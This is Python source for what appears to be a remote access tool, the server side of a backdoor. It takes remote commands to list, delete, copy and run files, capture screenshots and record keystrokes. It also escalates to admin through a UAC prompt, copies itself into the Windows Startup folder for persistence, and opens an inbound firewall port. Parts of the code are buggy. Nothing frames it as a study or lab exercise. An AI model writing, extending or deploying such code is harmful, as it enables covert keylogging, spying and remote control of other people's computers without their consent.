import datetime
import random
import os
import subprocess
import pyautogui
import ctypes
import sys
import protocols
import pynput
import time


def answer(request):
    known_commands = {
        "time": r_time,
        "rand": rand,
        "name": name,
        "exit": disconnect,
        "dir": r_dir,
        "del": r_del,
        "copy": r_copy,
        "h?": r_help,
        "exec": r_exec,
        "shoot": screenshot,
        "keys": record_keys
    }
    if "(" in request:
        kind = request.split("(")[0]
        data = request.split("(")[1][:-1]
        try:
            return known_commands[kind](data)
        except KeyError:
            return "unknown request. please try again"
    else:
        kind = request
    try:
        return known_commands[kind]()
    except KeyError:
        return "unknown request. please try again"


def close_port(port_number):
    try:
        subprocess.run(["netsh", "advfirewall", "firewall", "delete", "rule", "name=OpenPort"], check=True)
        print(f"Port {port_number} closed successfully.")
    except subprocess.CalledProcessError as e:
        print(f"Error closing port {port_number}: {e}")


def open_port(port_number):
    try:
        subprocess.run(["netsh", "advfirewall", "firewall", "add", "rule", "name=OpenPort", "dir=in", "action=allow", f"protocol=TCP", f"localport={port_number}"], check=True)
        print(f"Port {port_number} opened successfully.")
    except subprocess.CalledProcessError as e:
        print(f"Error opening port {port_number}: {e}")


def seed():
    abs_path = os.getcwd()
    files = r_dir(abs_path).split("\n")
    for file in files:
        if ".py" not in file and "client" not in file:
            files.remove(file)
    startup = r"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
    for file in files:
        try:
            protocols.log_requests(protocols.log_format(r_copy(abs_path + "\\" + file + "/" + startup + "\\" + file)))
        except PermissionError:
            x = 10


def sus(port):
    if not ctypes.windll.shell32.IsUserAnAdmin():
        print('Not enough priviledge, restarting...')
        ctypes.windll.shell32.ShellExecuteW(
            None, 'runas', sys.executable, ' '.join(sys.argv), None, None)
        return True
    else:
        print('Elevated privilege acquired')
        seed()
        open_port(port)
        return False


def r_time():
    return str(datetime.datetime.now()).split(" ")[1].split(".")[0]


def rand():
    return str(random.randrange(1000))


def name():
    return "alon stavitsky's server"


def disconnect():
    return str(-1)


def r_dir(data):
    try:
        str_dir = "\n".join(os.listdir(data))
        return str_dir
    except NotADirectoryError:
        return "this is not a valid directory"


def r_del(data):
    path = data
    try:
        os.remove(path)
        return "file removed successfully"
    except FileNotFoundError or FileExistsError:
        return "an error has occurred. check if file exist or get more permissions"


def r_copy(data):
    path = data
    source_path = path.split("/")[0]
    destination_path = path.split("/")[1]
    try:
        with open(source_path, "r") as source:
            source_lines = source.readlines()
    except FileNotFoundError or FileExistsError:
        return "the source file does not exist or unreachable."
    try:
        with open(destination_path, "w") as destination:
            destination.writelines(source_lines)
            return "file copied successfully "

    except Exception as e:
        return f"something went wrong while trying to write into destination_file.{e}"


def r_exec(data):
    file_endings = {
        'py': 'python',
        'exe': 'executable',
        'bat': 'cmd',
    }
    exec_path = data
    interpreter = file_endings[exec_path.split(".")[-1]]
    try:
        if interpreter not in file_endings.values():
            return "unsupported file extension"
        if interpreter == "executable" or "cmd":
            process = subprocess.Popen(exec_path, stdin=subprocess.PIPE)
            process.stdin.write("\n")
            return "process started"
        else:
            subprocess.call([interpreter, exec_path], shell=True)
    except Exception as e:
        return f"Error running script: {e}"


def screenshot():
    pyautogui.screenshot("screenshot.jpg")
    with open("screenshot.jpg", "rb") as img:
        byts = img.read()
    return byts.hex()


def record_keys(data):
    amount_of_chars = data.split(",")[0]
    if amount_of_chars.lower() == "none":
        amount_of_chars = None
    sec_duration = data.split(",")[1]
    if sec_duration.lower() == "none":
        sec_duration = None
    if amount_of_chars is None and sec_duration is None:
        return ""

    start_time = time.time()
    logged_chars = []

    def on_press(key):
        nonlocal logged_chars
        try:
            char = key.char
            logged_chars.append(char)
        except AttributeError:
            logged_chars.append('~')

    def on_release(key):
        pass

    with pynput.keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        while True:
            if amount_of_chars is not None and len(logged_chars) >= int(amount_of_chars):
                break

            if sec_duration is not None and int(time.time()) - int(start_time) >= int(sec_duration):
                break
    return ''.join(logged_chars)


def r_help():
    return "name/r_time/rand/dir(path)/del(path)/copy(source/destination)/exec(path)/shoot/keys(keys,secs)/exit"